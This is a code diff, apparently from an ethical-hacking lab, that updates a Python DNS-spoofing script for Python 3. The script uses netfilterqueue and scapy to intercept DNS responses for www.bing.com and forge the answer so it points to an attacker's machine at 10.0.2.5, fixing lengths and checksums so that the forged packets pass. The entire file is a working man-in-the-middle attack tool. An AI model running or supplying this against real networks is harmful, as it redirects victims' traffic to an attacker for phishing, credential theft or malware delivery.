@@ -1,17 +1,21 @@
 #! /usr/bin/env python
-# WARNING: Not compatible with Python 3.x
+# Compatibility: Python 3.x
 
 import netfilterqueue
 import scapy.all as scapy
 
 
+# TODO: Cleanup all scripts with scapy to load appropriate modules such that PyCharm doesn't complain.
+# Resource: https://stackoverflow.com/questions/45691654/unresolved-reference-with-scapy
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        if "www.bing.com" in qname:
+        if "www.bing.com" in str(qname):
             print("[+] Spoofing target...")
-            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.10")
+            # TODO: Add, wherever possible, the ip address of kali machine
+            #  as an argument to program or get it automatically.
+            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.5")
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
@@ -20,12 +24,12 @@ def process_packet(packet):
             del scapy_packet[scapy.UDP].len
             del scapy_packet[scapy.UDP].chksum
 
-            packet.set_payload(str(scapy_packet))
+            packet.set_payload(bytes(scapy_packet))
 
     packet.accept()
 
 
-print("Queue has been created.")
+print("[+] Queue has been created.")
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
 queue.run()
